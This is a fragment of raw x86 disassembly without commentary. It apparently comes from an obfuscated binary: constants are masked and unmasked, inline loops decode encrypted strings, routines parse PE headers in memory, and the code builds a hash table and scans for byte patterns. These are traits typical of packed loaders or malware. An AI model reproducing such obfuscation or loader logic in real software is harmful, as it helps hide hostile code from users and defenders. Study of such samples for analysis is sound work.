  41d937:	dec    DWORD PTR [ebp-0x14]
  41d93a:	jne    0x41d910
  41d93c:	mov    ebx,DWORD PTR [ebp-0x18]
  41d93f:	inc    ebx
  41d940:	mov    DWORD PTR [ebp-0x18],ebx
  41d943:	cmp    ebx,DWORD PTR [ebp-0x8]
  41d946:	jb     0x41d8dc
  41d948:	pop    esi
  41d949:	pop    ebx
  41d94a:	pop    edi
  41d94b:	leave  
  41d94c:	ret    0x4
  41d94f:	push   ebp
  41d950:	mov    ebp,esp
  41d952:	mov    eax,DWORD PTR [ebp+0x8]
  41d955:	push   esi
  41d956:	push   DWORD PTR [eax+0x1d8]
  41d95c:	lea    esi,[eax+0x198]
  41d962:	mov    eax,DWORD PTR [ebp+0x8]
  41d965:	call   0x41d7fe
  41d96a:	mov    ecx,DWORD PTR [esi]
  41d96c:	mov    DWORD PTR [ecx],eax
  41d96e:	mov    eax,DWORD PTR [esi]
  41d970:	xor    ecx,ecx
  41d972:	cmp    DWORD PTR [eax],ecx
  41d974:	pop    esi
  41d975:	setne  cl
  41d978:	mov    eax,ecx
  41d97a:	pop    ebp
  41d97b:	ret    0x4
  41d97e:	mov    ecx,DWORD PTR [edi+0x188]
  41d984:	push   ebx
  41d985:	jmp    0x41d99a
  41d987:	xor    eax,0x8a8c
  41d98c:	add    eax,0x3b50
  41d991:	mov    WORD PTR [ecx],ax
  41d994:	add    ecx,0x2
  41d997:	add    edx,0x2
  41d99a:	movzx  eax,WORD PTR [edx]
  41d99d:	mov    ebx,0x4e3c
  41d9a2:	cmp    ax,bx
  41d9a5:	jne    0x41d987
  41d9a7:	xor    eax,eax
  41d9a9:	mov    WORD PTR [ecx],ax
  41d9ac:	mov    eax,DWORD PTR [edi+0x188]
  41d9b2:	pop    ebx
  41d9b3:	ret    
  41d9b4:	push   edi
  41d9b5:	mov    edi,eax
  41d9b7:	mov    eax,DWORD PTR [esi+0x188]
  41d9bd:	shl    edi,0x6
  41d9c0:	add    eax,edi
  41d9c2:	jmp    0x41d9ce
  41d9c4:	xor    cl,0x73
  41d9c7:	sub    cl,0x9
  41d9ca:	mov    BYTE PTR [eax],cl
  41d9cc:	inc    eax
  41d9cd:	inc    edx
  41d9ce:	mov    cl,BYTE PTR [edx]
  41d9d0:	cmp    cl,0x7a
  41d9d3:	jne    0x41d9c4
  41d9d5:	mov    BYTE PTR [eax],0x0
  41d9d8:	mov    eax,DWORD PTR [esi+0x188]
  41d9de:	add    eax,edi
  41d9e0:	pop    edi
  41d9e1:	ret    
  41d9e2:	push   ebp
  41d9e3:	mov    ebp,esp
  41d9e5:	sub    esp,0x38
  41d9e8:	push   ebx
  41d9e9:	mov    ebx,0xf89c85b9
  41d9ee:	mov    DWORD PTR [ebp-0x4],ebx
  41d9f1:	lea    eax,[ebx-0x1]
  41d9f4:	push   esi
  41d9f5:	mov    DWORD PTR [ebp-0x24],eax
  41d9f8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d9fb:	mov    edx,DWORD PTR [ebp+0x8]
  41d9fe:	mov    esi,0x7510899
  41da03:	push   edi
  41da04:	xor    ecx,esi
  41da06:	mov    edi,0x3272e0
  41da0b:	add    ecx,edi
  41da0d:	cmp    edx,ecx
  41da0f:	je     0x41db7d
  41da15:	mov    ecx,DWORD PTR [ebp-0x4]
  41da18:	mov    edx,DWORD PTR [ebp+0xc]
  41da1b:	xor    ecx,esi
  41da1d:	add    ecx,edi
  41da1f:	cmp    edx,ecx
  41da21:	je     0x41db7d
  41da27:	mov    ecx,DWORD PTR [ebp+0x10]
  41da2a:	mov    DWORD PTR [ebp-0x18],ecx
  41da2d:	mov    ecx,DWORD PTR [ebp+0xc]
  41da30:	mov    DWORD PTR [ebp-0x14],ecx
  41da33:	mov    ecx,DWORD PTR [ebp+0x8]
  41da36:	mov    DWORD PTR [ebp-0x1c],0xf89c8504
  41da3d:	mov    DWORD PTR [ebp-0x20],eax
  41da40:	mov    DWORD PTR [ebp-0x10],ebx
  41da43:	mov    DWORD PTR [ebp+0xc],eax
  41da46:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41da4d:	mov    eax,DWORD PTR [ebp+0xc]
  41da50:	mov    DWORD PTR [ebp-0xc],ecx
  41da53:	xor    eax,esi
  41da55:	mov    ecx,0xffcd8d20
  41da5a:	sub    ecx,eax
  41da5c:	add    ecx,DWORD PTR [ebp-0x14]
  41da5f:	mov    DWORD PTR [ebp+0x8],ecx
  41da62:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  41da69:	jmp    0x41db6d
  41da6e:	mov    eax,DWORD PTR [ebp+0xc]
  41da71:	mov    ecx,DWORD PTR [ebp+0xc]
  41da74:	xor    eax,esi
  41da76:	xor    ecx,esi
  41da78:	lea    ecx,[eax+ecx*1+0x64e5c0]
  41da7f:	mov    eax,DWORD PTR [ebp+0x8]
  41da82:	xor    edx,edx
  41da84:	div    ecx
  41da86:	mov    eax,DWORD PTR [ebp+0x10]
  41da89:	mov    ecx,DWORD PTR [ebp+0xc]
  41da8c:	xor    eax,esi
  41da8e:	xor    ecx,esi
  41da90:	sub    eax,ecx
  41da92:	cmp    edx,eax
  41da94:	jne    0x41db29
  41da9a:	mov    eax,DWORD PTR [ebp+0x8]
  41da9d:	add    eax,DWORD PTR [ebp-0xc]
  41daa0:	mov    dl,BYTE PTR [eax]
  41daa2:	mov    eax,DWORD PTR [ebp-0x10]
  41daa5:	mov    ecx,DWORD PTR [ebp-0x8]
  41daa8:	xor    eax,esi
  41daaa:	xor    ecx,esi
  41daac:	add    eax,edi
  41daae:	add    ecx,edi
  41dab0:	cmp    eax,ecx
  41dab2:	jae    0x41dafa
  41dab4:	lea    ecx,[eax-0x3272e0]
  41daba:	mov    DWORD PTR [ebp-0x4],ecx
  41dabd:	mov    ebx,DWORD PTR [ebp-0x4]
  41dac0:	xor    ebx,esi
  41dac2:	add    ebx,0x7f55d8fb
  41dac8:	lea    ecx,[ebp+eax*4-0x38]
  41dacc:	mov    DWORD PTR [ecx],ebx
  41dace:	mov    ebx,DWORD PTR [ecx]
  41dad0:	cmp    ebx,0x244ecbda
  41dad6:	jbe    0x41dae0
  41dad8:	add    DWORD PTR [ecx],0x405fc1d
  41dade:	jmp    0x41dae6
  41dae0:	add    DWORD PTR [ecx],0xfdaf43e3
  41dae6:	mov    ecx,DWORD PTR [ebp-0x8]
  41dae9:	xor    ecx,esi
  41daeb:	inc    eax
  41daec:	inc    DWORD PTR [ebp-0x4]
  41daef:	add    ecx,edi
  41daf1:	cmp    eax,ecx
  41daf3:	jb     0x41dabd
  41daf5:	mov    ebx,0xf89c85b9
  41dafa:	mov    eax,DWORD PTR [ebp-0x18]
  41dafd:	test   eax,eax
  41daff:	jne    0x41db09
  41db01:	xor    dl,0x73
  41db04:	sub    dl,0x9
  41db07:	jmp    0x41db1f
  41db09:	mov    eax,DWORD PTR [ebp-0x1c]
  41db0c:	xor    al,0x99
  41db0e:	mov    cl,0x20
  41db10:	sub    cl,al
  41db12:	add    dl,cl
  41db14:	mov    ecx,DWORD PTR [ebp-0x20]
  41db17:	xor    cl,0x99
  41db1a:	sub    cl,0x20
  41db1d:	ror    dl,cl
  41db1f:	xor    eax,eax
  41db21:	mov    eax,DWORD PTR [ebp+0x8]
  41db24:	add    eax,DWORD PTR [ebp-0xc]
  41db27:	mov    BYTE PTR [eax],dl
  41db29:	mov    eax,DWORD PTR [ebp+0x8]
  41db2c:	mov    ecx,DWORD PTR [ebp-0x10]
  41db2f:	sub    eax,edi
  41db31:	xor    eax,esi
  41db33:	cmp    eax,ecx
  41db35:	jne    0x41db5b
  41db37:	mov    eax,DWORD PTR [ebp+0x10]
  41db3a:	mov    ecx,DWORD PTR [ebp+0xc]
  41db3d:	xor    eax,esi
  41db3f:	xor    ecx,esi
  41db41:	sub    eax,ecx
  41db43:	sub    eax,edi
  41db45:	xor    eax,esi
  41db47:	mov    DWORD PTR [ebp+0x10],eax
  41db4a:	mov    eax,DWORD PTR [ebp+0xc]
  41db4d:	xor    eax,esi
  41db4f:	mov    ecx,0xffcd8d20
  41db54:	sub    ecx,eax
  41db56:	add    ecx,DWORD PTR [ebp-0x14]
  41db59:	jmp    0x41db6a
  41db5b:	mov    eax,DWORD PTR [ebp+0xc]
  41db5e:	xor    eax,esi
  41db60:	mov    ecx,0xffcd8d20
  41db65:	sub    ecx,eax
  41db67:	add    ecx,DWORD PTR [ebp+0x8]
  41db6a:	mov    DWORD PTR [ebp+0x8],ecx
  41db6d:	mov    eax,DWORD PTR [ebp+0x10]
  41db70:	cmp    eax,ebx
  41db72:	jne    0x41da6e
  41db78:	mov    eax,DWORD PTR [ebp-0x24]
  41db7b:	jmp    0x41db80
  41db7d:	mov    eax,DWORD PTR [ebp-0x4]
  41db80:	xor    eax,esi
  41db82:	add    eax,edi
  41db84:	pop    edi
  41db85:	pop    esi
  41db86:	pop    ebx
  41db87:	leave  
  41db88:	ret    0xc
  41db8b:	push   ebp
  41db8c:	mov    ebp,esp
  41db8e:	sub    esp,0x14
  41db91:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  41db98:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  41db9f:	mov    eax,DWORD PTR [ebx]
  41dba1:	mov    DWORD PTR [ebp-0x8],eax
  41dba4:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  41dbab:	push   esi
  41dbac:	push   edi
  41dbad:	mov    DWORD PTR [ebp-0x14],0xead718d9
  41dbb4:	mov    edi,DWORD PTR [ebp-0x4]
  41dbb7:	mov    ecx,DWORD PTR [ebp-0x10]
  41dbba:	mov    eax,0x7510899
  41dbbf:	xor    edi,eax
  41dbc1:	mov    edx,0x3272e0
  41dbc6:	xor    ecx,eax
  41dbc8:	add    edi,edx
  41dbca:	add    ecx,edx
  41dbcc:	imul   edi,ecx
  41dbcf:	jmp    0x41dc17
  41dbd1:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbd4:	mov    esi,DWORD PTR [ebp-0x4]
  41dbd7:	xor    ecx,eax
  41dbd9:	xor    esi,eax
  41dbdb:	add    ecx,edx
  41dbdd:	add    esi,edx
  41dbdf:	test   esi,ecx
  41dbe1:	mov    esi,DWORD PTR [ebp-0x8]
  41dbe4:	mov    ecx,DWORD PTR [ebp-0x4]
  41dbe7:	je     0x41dbfe
  41dbe9:	xor    ecx,eax
  41dbeb:	xor    esi,eax
  41dbed:	add    ecx,edx
  41dbef:	add    esi,edx
  41dbf1:	shr    esi,cl
  41dbf3:	mov    ecx,DWORD PTR [ebp-0x14]
  41dbf6:	xor    ecx,eax
  41dbf8:	add    ecx,edx
  41dbfa:	xor    esi,ecx
  41dbfc:	jmp    0x41dc08
  41dbfe:	xor    esi,eax
  41dc00:	xor    ecx,eax
  41dc02:	add    esi,edx
  41dc04:	add    ecx,edx
  41dc06:	shr    esi,cl
  41dc08:	mov    DWORD PTR [ebp-0x8],esi
  41dc0b:	mov    ecx,DWORD PTR [ebp-0x4]
  41dc0e:	xor    ecx,eax
  41dc10:	lea    edi,[edi+ecx*1+0x3272e0]
  41dc17:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc1a:	mov    esi,DWORD PTR [ebp-0x4]
  41dc1d:	xor    esi,eax
  41dc1f:	xor    ecx,eax
  41dc21:	sub    ecx,esi
  41dc23:	cmp    edi,ecx
  41dc25:	jbe    0x41dbd1
  41dc27:	mov    eax,DWORD PTR [ebp-0x8]
  41dc2a:	pop    edi
  41dc2b:	mov    DWORD PTR [ebx],eax
  41dc2d:	mov    eax,DWORD PTR [ebp-0x8]
  41dc30:	pop    esi
  41dc31:	leave  
  41dc32:	ret    
  41dc33:	push   ebp
  41dc34:	mov    ebp,esp
  41dc36:	sub    esp,0x420
  41dc3c:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  41dc43:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  41dc4a:	mov    DWORD PTR [ebp-0x18],0xf89c86b9
  41dc51:	push   ebx
  41dc52:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41dc59:	mov    eax,DWORD PTR [ebp-0x14]
  41dc5c:	push   esi
  41dc5d:	mov    esi,0x7510899
  41dc62:	push   edi
  41dc63:	xor    eax,esi
  41dc65:	mov    edi,0x3272e0
  41dc6a:	add    eax,edi
  41dc6c:	mov    DWORD PTR [ebp-0x8],eax
  41dc6f:	mov    DWORD PTR [ebp-0x20],0xf89c85b1
  41dc76:	mov    DWORD PTR [ebp-0x4],0xead718d9
  41dc7d:	mov    DWORD PTR [ebp-0x10],0x8
  41dc84:	mov    ecx,ecx
  41dc86:	mov    eax,DWORD PTR [ebp-0xc]
  41dc89:	mov    ecx,DWORD PTR [ebp-0x14]
  41dc8c:	xor    eax,esi
  41dc8e:	xor    ecx,esi
  41dc90:	add    eax,edi
  41dc92:	add    ecx,edi
  41dc94:	imul   eax,ecx
  41dc97:	jmp    0x41dcca
  41dc99:	mov    eax,DWORD PTR [ebp-0x4]
  41dc9c:	sub    eax,edi
  41dc9e:	xor    eax,esi
  41dca0:	mov    DWORD PTR [ebp-0x8],eax
  41dca3:	lea    ebx,[ebp-0x8]
  41dca6:	call   0x41db8b
  41dcab:	mov    DWORD PTR [ebp-0x8],eax
  41dcae:	mov    eax,DWORD PTR [ebp-0x8]
  41dcb1:	mov    ecx,DWORD PTR [ebp-0x4]
  41dcb4:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41dcbb:	mov    eax,DWORD PTR [ebp-0xc]
  41dcbe:	mov    ecx,DWORD PTR [ebp-0x4]
  41dcc1:	xor    eax,esi
  41dcc3:	lea    eax,[eax+ecx*1+0x3272e0]
  41dcca:	mov    DWORD PTR [ebp-0x4],eax
  41dccd:	mov    eax,DWORD PTR [ebp-0x18]
  41dcd0:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcd3:	xor    ecx,esi
  41dcd5:	xor    eax,esi
  41dcd7:	sub    eax,ecx
  41dcd9:	mov    ecx,DWORD PTR [ebp-0x4]
  41dcdc:	cmp    ecx,eax
  41dcde:	jbe    0x41dc99
  41dce0:	mov    eax,DWORD PTR [ebp-0x1c]
  41dce3:	xor    eax,esi
  41dce5:	add    eax,edi
  41dce7:	mov    DWORD PTR [ebp-0x8],eax
  41dcea:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41dcf1:	mov    ebx,ebx
  41dcf3:	jmp    0x41dd56
  41dcf5:	mov    ecx,DWORD PTR [ebp-0x20]
  41dcf8:	mov    eax,DWORD PTR [ebp-0x8]
  41dcfb:	xor    ecx,esi
  41dcfd:	add    ecx,edi
  41dcff:	shr    eax,cl
  41dd01:	mov    DWORD PTR [ebp-0x4],eax
  41dd04:	mov    eax,DWORD PTR [ebp+0x8]
  41dd07:	mov    cl,BYTE PTR [eax]
  41dd09:	mov    BYTE PTR [ebp+0xb],cl
  41dd0c:	mov    cl,BYTE PTR [ebp+0xb]
  41dd0f:	mov    edx,DWORD PTR [ebp-0x8]
  41dd12:	movzx  ecx,cl
  41dd15:	xor    ecx,edx
  41dd17:	mov    DWORD PTR [ebp+0x8],ecx
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd1d:	mov    edx,DWORD PTR [ebp+0x8]
  41dd20:	xor    ecx,esi
  41dd22:	add    ecx,edi
  41dd24:	and    ecx,edx
  41dd26:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41dd2d:	mov    edx,DWORD PTR [ebp-0x4]
  41dd30:	xor    ecx,edx
  41dd32:	mov    DWORD PTR [ebp-0x8],ecx
  41dd35:	mov    ecx,DWORD PTR [ebp-0xc]
  41dd38:	xor    ecx,esi
  41dd3a:	lea    eax,[eax+ecx*1+0x3272e0]
  41dd41:	mov    DWORD PTR [ebp+0x8],eax
  41dd44:	mov    eax,DWORD PTR [ebp-0xc]
  41dd47:	xor    eax,esi
  41dd49:	mov    ecx,0xffcd8d20
  41dd4e:	sub    ecx,eax
  41dd50:	add    ecx,DWORD PTR [ebp-0x10]
  41dd53:	mov    DWORD PTR [ebp-0x10],ecx
  41dd56:	mov    eax,DWORD PTR [ebp-0x14]
  41dd59:	mov    ecx,DWORD PTR [ebp-0x10]
  41dd5c:	xor    eax,esi
  41dd5e:	add    eax,edi
  41dd60:	cmp    ecx,eax
  41dd62:	jne    0x41dcf5
  41dd64:	mov    eax,DWORD PTR [ebp-0x1c]
  41dd67:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd6a:	xor    eax,esi
  41dd6c:	add    eax,edi
  41dd6e:	pop    edi
  41dd6f:	pop    esi
  41dd70:	xor    eax,ecx
  41dd72:	pop    ebx
  41dd73:	leave  
  41dd74:	ret    0x4
  41dd77:	push   ebp
  41dd78:	mov    ebp,esp
  41dd7a:	mov    eax,DWORD PTR [ebp+0x1c]
  41dd7d:	mov    ecx,DWORD PTR [ebp+0x8]
  41dd80:	mov    edx,DWORD PTR [ebp+0x10]
  41dd83:	mov    eax,DWORD PTR [eax+0x190]
  41dd89:	mov    eax,DWORD PTR [eax]
  41dd8b:	sub    esp,0x64
  41dd8e:	push   ebx
  41dd8f:	push   esi
  41dd90:	push   edi
  41dd91:	mov    edi,0x7510899
  41dd96:	xor    ecx,edi
  41dd98:	mov    ebx,0x3272e0
  41dd9d:	add    ecx,ebx
  41dd9f:	cmp    ecx,edx
  41dda1:	jne    0x41ddb2
  41dda3:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ddad:	jmp    0x41e2ae
  41ddb2:	mov    ecx,DWORD PTR [ebp+0x8]
  41ddb5:	mov    esi,DWORD PTR [ebp+0x14]
  41ddb8:	mov    edx,DWORD PTR [esi]
  41ddba:	xor    ecx,edi
  41ddbc:	add    ecx,ebx
  41ddbe:	cmp    edx,ecx
  41ddc0:	je     0x41e269
  41ddc6:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ddc9:	mov    DWORD PTR [ebp-0x1c],eax
  41ddcc:	mov    DWORD PTR [ebp+0x1c],ecx
  41ddcf:	mov    ecx,DWORD PTR [ebp+0x18]
  41ddd2:	mov    eax,DWORD PTR [esi]
  41ddd4:	mov    DWORD PTR [ebp-0x20],eax
  41ddd7:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  41ddde:	mov    edx,0xf89c85b8
  41dde3:	mov    DWORD PTR [ebp-0x8],edx
  41dde6:	mov    eax,DWORD PTR [ebp+0x1c]
  41dde9:	mov    DWORD PTR [ebp+0x1c],eax
  41ddec:	mov    eax,DWORD PTR [ebp+0x1c]
  41ddef:	mov    eax,DWORD PTR [eax+0x190]
  41ddf5:	mov    eax,DWORD PTR [eax]
  41ddf7:	mov    DWORD PTR [ebp-0x24],ecx
  41ddfa:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ddfd:	mov    ecx,DWORD PTR [ecx+0x190]
  41de03:	mov    ecx,DWORD PTR [ecx]
  41de05:	add    ecx,DWORD PTR [eax+0x3c]
  41de08:	mov    DWORD PTR [ebp+0x10],ecx
  41de0b:	mov    eax,DWORD PTR [ebp+0x8]
  41de0e:	xor    eax,edi
  41de10:	add    eax,ebx
  41de12:	mov    DWORD PTR [ebp-0x4],eax
  41de15:	mov    eax,DWORD PTR [ebp+0x8]
  41de18:	xor    eax,edi
  41de1a:	add    eax,ebx
  41de1c:	mov    DWORD PTR [ebp+0x18],eax
  41de1f:	mov    eax,DWORD PTR [ebp+0x10]
  41de22:	mov    eax,DWORD PTR [eax+0x50]
  41de25:	sub    eax,0xc
  41de28:	mov    DWORD PTR [ebp-0x28],eax
  41de2b:	mov    eax,DWORD PTR [ebp+0x10]
  41de2e:	mov    eax,DWORD PTR [eax+0x38]
  41de31:	mov    ecx,DWORD PTR [ebp+0x10]
  41de34:	dec    eax
  41de35:	test   DWORD PTR [ecx+0x54],eax
  41de38:	mov    eax,DWORD PTR [ebp+0x10]
  41de3b:	je     0x41de55
  41de3d:	mov    eax,DWORD PTR [eax+0x38]
  41de40:	mov    ecx,DWORD PTR [ebp+0x10]
  41de43:	mov    ecx,DWORD PTR [ecx+0x54]
  41de46:	dec    eax
  41de47:	not    eax
  41de49:	and    ecx,eax
  41de4b:	mov    eax,DWORD PTR [ebp+0x10]
  41de4e:	mov    eax,DWORD PTR [eax+0x38]
  41de51:	add    eax,ecx
  41de53:	jmp    0x41de58
  41de55:	mov    eax,DWORD PTR [eax+0x54]
  41de58:	mov    DWORD PTR [ebp+0x1c],eax
  41de5b:	mov    eax,DWORD PTR [ebp+0x8]
  41de5e:	xor    eax,edi
  41de60:	add    eax,ebx
  41de62:	mov    DWORD PTR [ebp+0x18],eax
  41de65:	mov    eax,DWORD PTR [ebp+0x8]
  41de68:	xor    eax,edi
  41de6a:	add    eax,ebx
  41de6c:	mov    DWORD PTR [ebp+0x18],eax
  41de6f:	mov    eax,DWORD PTR [ebp+0x8]
  41de72:	mov    ecx,DWORD PTR [ebp-0x24]
  41de75:	xor    eax,edi
  41de77:	add    eax,ebx
  41de79:	mov    DWORD PTR [ecx],eax
  41de7b:	mov    DWORD PTR [ebp+0x18],edx
  41de7e:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  41de85:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  41de8c:	mov    DWORD PTR [ebp+0x18],0xf89c85bd
  41de93:	mov    eax,DWORD PTR [ebp-0x8]
  41de96:	mov    ecx,DWORD PTR [ebp+0x1c]
  41de99:	xor    eax,edi
  41de9b:	add    eax,ebx
  41de9d:	imul   eax,ecx
  41dea0:	mov    ecx,DWORD PTR [ebp+0x8]
  41dea3:	mov    edx,DWORD PTR [ebp-0x28]
  41dea6:	xor    ecx,edi
  41dea8:	lea    ecx,[ecx+edx*1+0x3272e0]
  41deaf:	cmp    eax,ecx
  41deb1:	jae    0x41e262
  41deb7:	mov    eax,DWORD PTR [ebp+0x8]
  41deba:	xor    eax,edi
  41debc:	add    eax,ebx
  41debe:	mov    DWORD PTR [ebp+0x18],eax
  41dec1:	mov    eax,DWORD PTR [ebp+0x1c]
  41dec4:	add    eax,DWORD PTR [ebp-0x1c]
  41dec7:	mov    DWORD PTR [ebp-0x4],eax
  41deca:	push   DWORD PTR [ebp-0x4]
  41decd:	mov    esi,DWORD PTR [ebp-0x1c]
  41ded0:	mov    ecx,DWORD PTR [ebp+0x10]
  41ded3:	call   0x41cfcb
  41ded8:	mov    DWORD PTR [ebp+0xc],eax
  41dedb:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  41dee2:	mov    eax,DWORD PTR [ebp-0x18]
  41dee5:	xor    eax,edi
  41dee7:	lea    ecx,[ebp-0x40]
  41deea:	add    eax,ebx
  41deec:	push   ecx
  41deed:	call   0x41d5ae
  41def2:	mov    eax,DWORD PTR [ebp+0xc]
  41def5:	test   eax,eax
  41def7:	je     0x41df47
  41def9:	mov    eax,DWORD PTR [ebp-0x18]
  41defc:	xor    eax,edi
  41defe:	add    eax,ebx
  41df00:	push   eax
  41df01:	push   DWORD PTR [ebp+0xc]
  41df04:	lea    eax,[ebp-0x40]
  41df07:	push   eax
  41df08:	call   0x41d455
  41df0d:	mov    eax,DWORD PTR [ebp-0x4]
  41df10:	mov    DWORD PTR [ebp-0x18],eax
  41df13:	mov    eax,DWORD PTR [ebp-0x18]
  41df16:	mov    ecx,DWORD PTR [ebp-0x1c]
  41df19:	sub    eax,ecx
  41df1b:	mov    DWORD PTR [ebp-0x18],eax
  41df1e:	mov    eax,DWORD PTR [ebp+0xc]
  41df21:	mov    ecx,DWORD PTR [ebp+0xc]
  41df24:	mov    eax,DWORD PTR [eax+0x10]
  41df27:	add    eax,DWORD PTR [ecx+0xc]
  41df2a:	mov    ecx,DWORD PTR [ebp-0x18]
  41df2d:	cmp    ecx,eax
  41df2f:	jb     0x41df47
  41df31:	mov    eax,DWORD PTR [ebp+0xc]
  41df34:	mov    eax,DWORD PTR [eax+0xc]
  41df37:	mov    ecx,DWORD PTR [ebp+0xc]
  41df3a:	add    eax,DWORD PTR [ecx+0x8]
  41df3d:	mov    ecx,DWORD PTR [ebp-0x18]
  41df40:	sub    eax,ecx
  41df42:	jmp    0x41e235
  41df47:	push   0xc
  41df49:	push   DWORD PTR [ebp-0x4]
  41df4c:	lea    eax,[ebp-0x4c]
  41df4f:	push   eax
  41df50:	call   0x41d455
  41df55:	mov    eax,0xf89c85b9
  41df5a:	mov    DWORD PTR [ebp-0x2c],eax
  41df5d:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  41df64:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  41df6b:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  41df72:	lea    ecx,[ebp-0x2c]
  41df75:	mov    DWORD PTR [ebp-0xc],ecx
  41df78:	lea    ecx,[ebp-0x30]
  41df7b:	mov    DWORD PTR [ebp-0x10],ecx
  41df7e:	lea    ecx,[ebp-0x34]
  41df81:	mov    DWORD PTR [ebp+0xc],ecx
  41df84:	lea    ecx,[ebp-0x38]
  41df87:	mov    DWORD PTR [ebp-0x14],ecx
  41df8a:	mov    ecx,DWORD PTR [ebp+0x8]
  41df8d:	xor    ecx,edi
  41df8f:	add    ecx,ebx
  41df91:	mov    DWORD PTR [ebp-0x18],ecx
  41df94:	jmp    0x41e190
  41df99:	cmp    eax,0xf89c85bb
  41df9e:	je     0x41e1a2
  41dfa4:	mov    ecx,DWORD PTR [ebp-0x8]
  41dfa7:	xor    ecx,edi
  41dfa9:	mov    esi,eax
  41dfab:	add    ecx,ebx
  41dfad:	mov    DWORD PTR [ebp+0x18],ecx
  41dfb0:	mov    eax,DWORD PTR [ebp-0x18]
  41dfb3:	xor    esi,edi
  41dfb5:	lea    eax,[eax+esi*1+0x3272e0]
  41dfbc:	mov    DWORD PTR [ebp-0x18],eax
  41dfbf:	mov    eax,DWORD PTR [ebp-0x8]
  41dfc2:	mov    ecx,DWORD PTR [ebp-0x18]
  41dfc5:	xor    eax,edi
  41dfc7:	add    eax,ebx
  41dfc9:	cmp    ecx,eax
  41dfcb:	jne    0x41dfe0
  41dfcd:	mov    eax,DWORD PTR [ebp+0x8]
  41dfd0:	xor    eax,edi
  41dfd2:	add    eax,ebx
  41dfd4:	push   eax
  41dfd5:	push   0xc
  41dfd7:	lea    eax,[ebp-0x4c]
  41dfda:	push   eax
  41dfdb:	call   0x41d9e2
  41dfe0:	mov    eax,DWORD PTR [ebp-0xc]
  41dfe3:	mov    eax,DWORD PTR [eax]
  41dfe5:	xor    eax,edi
  41dfe7:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41dfee:	mov    ecx,DWORD PTR [ebp+0x8]
  41dff1:	xor    ecx,edi
  41dff3:	movzx  eax,al
  41dff6:	add    ecx,ebx
  41dff8:	cmp    eax,ecx
  41dffa:	je     0x41e178
  41e000:	mov    eax,DWORD PTR [ebp-0x10]
  41e003:	mov    eax,DWORD PTR [eax]
  41e005:	xor    eax,edi
  41e007:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e00e:	mov    ecx,DWORD PTR [ebp+0x8]
  41e011:	xor    ecx,edi
  41e013:	movzx  eax,al
  41e016:	add    ecx,ebx
  41e018:	cmp    eax,ecx
  41e01a:	je     0x41e178
  41e020:	mov    eax,DWORD PTR [ebp+0xc]
  41e023:	mov    eax,DWORD PTR [eax]
  41e025:	xor    eax,edi
  41e027:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e02e:	mov    ecx,DWORD PTR [ebp+0x8]
  41e031:	xor    ecx,edi
  41e033:	movzx  eax,al
  41e036:	add    ecx,ebx
  41e038:	cmp    eax,ecx
  41e03a:	je     0x41e178
  41e040:	mov    eax,DWORD PTR [ebp-0x14]
  41e043:	mov    eax,DWORD PTR [eax]
  41e045:	xor    eax,edi
  41e047:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e04e:	mov    ecx,DWORD PTR [ebp+0x8]
  41e051:	xor    ecx,edi
  41e053:	movzx  eax,al
  41e056:	add    ecx,ebx
  41e058:	cmp    eax,ecx
  41e05a:	je     0x41e178
  41e060:	mov    eax,DWORD PTR [ebp-0x10]
  41e063:	mov    eax,DWORD PTR [eax]
  41e065:	xor    eax,edi
  41e067:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e06e:	mov    ecx,DWORD PTR [ebp-0xc]
  41e071:	mov    ecx,DWORD PTR [ecx]
  41e073:	xor    ecx,edi
  41e075:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e07c:	xor    al,cl
  41e07e:	mov    ecx,DWORD PTR [ebp+0xc]
  41e081:	mov    ecx,DWORD PTR [ecx]
  41e083:	xor    ecx,edi
  41e085:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e08c:	or     al,cl
  41e08e:	mov    ecx,DWORD PTR [ebp-0xc]
  41e091:	mov    ecx,DWORD PTR [ecx]
  41e093:	xor    ecx,edi
  41e095:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e09c:	cmp    cl,al
  41e09e:	jne    0x41e178
  41e0a4:	mov    eax,DWORD PTR [ebp+0xc]
  41e0a7:	mov    eax,DWORD PTR [eax]
  41e0a9:	xor    eax,edi
  41e0ab:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e0b2:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0b5:	mov    ecx,DWORD PTR [ecx]
  41e0b7:	xor    ecx,edi
  41e0b9:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e0c0:	xor    al,cl
  41e0c2:	mov    ecx,DWORD PTR [ebp-0x14]
  41e0c5:	mov    ecx,DWORD PTR [ecx]
  41e0c7:	xor    ecx,edi
  41e0c9:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e0d0:	or     al,cl
